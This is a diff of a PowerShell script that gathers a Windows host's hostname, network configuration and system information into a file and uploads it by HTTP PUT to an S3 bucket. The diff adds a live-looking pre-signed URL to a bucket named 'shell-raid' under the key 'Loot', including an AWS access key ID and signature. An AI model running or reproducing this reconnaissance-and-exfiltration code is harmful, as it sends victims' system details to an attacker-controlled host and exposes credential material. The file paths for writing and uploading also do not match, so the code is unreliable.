@@ -12,7 +12,8 @@ $info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
 $info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
 
 # Task 2: Upload the system information file to S3 using a pre-signed URL
-$presignedUrl = "https://529088270990.signin.aws.amazon.com/console"  # Replace with the actual pre-signed URL
+$presignedUrl = "https://shell-raid.s3.amazonaws.com/Loot?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXWMA6KKHPN45EZG4%2F20241030%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20241030T130459Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=90f8c842bfacf78529643bcda81e70de2e47501b6e62df43779b73c14a408ad9"  
+
 $fileToUpload = "$programFilesFolder\sysinfo.txt"
 
 Invoke-WebRequest -Uri $presignedUrl -Method Put -InFile $fileToUpload -ContentType "text/plain"
